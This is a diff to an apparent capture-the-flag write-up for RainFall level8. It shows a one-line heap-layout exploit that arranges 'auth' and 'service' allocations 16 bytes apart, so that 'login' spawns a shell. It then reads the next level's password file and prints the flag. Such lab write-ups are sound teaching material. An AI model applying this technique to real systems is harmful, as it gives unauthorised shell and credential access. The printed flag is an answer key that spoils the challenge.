@@ -68,8 +68,6 @@ int main(void)
 
 | Element | Address | Notes |
 |---------|---------|-------|
-| **Global `auth`** | `0x08049aac` | Pointer stored in .bss |
-| **Global `service`** | `0x08049ab0` | Pointer stored in .bss |
 | **auth heap** | `0x0804a008` | 4-byte allocation (runtime) |
 | **service heap** | `0x0804a018` | Variable size (runtime) |
 
@@ -376,22 +374,19 @@ Level8 introduces **heap layout manipulation**:
 ## 💣 Execute the Exploit
 
 ```bash
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth AAAA
-0x804a008, (nil)
-service BBBBBBBBBBBBBBBB
-0x804a008, 0x804a018
-login
-$ cat /home/user/level9/.pass
+level8@RainFall:~$ (echo "auth "; echo "serviceBBBBBBBBBBBBBBBB"; echo "login"; cat) | ./level8
+(nil), (nil) 
+0x804a008, (nil) 
+0x804a008, 0x804a018 
+cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 
-**Expected behavior:**
-1. First line shows both pointers as NULL
-2. After `auth`, only auth is allocated
-3. After `service`, both are allocated **16 bytes apart**
-4. After `login`, shell spawns!
+**Explanation:**
+- `echo "auth "` - Allocates 4-byte auth buffer at 0x804a008
+- `echo "serviceBBBBBBBBBBBBBBBB"` - Allocates service at 0x804a018 (16 bytes after auth)
+- `echo "login"` - Triggers the check: auth[32] reads into service buffer → non-zero → shell!
+- `cat` - Keeps stdin open so we can interact with the spawned shell
 
 ---
 
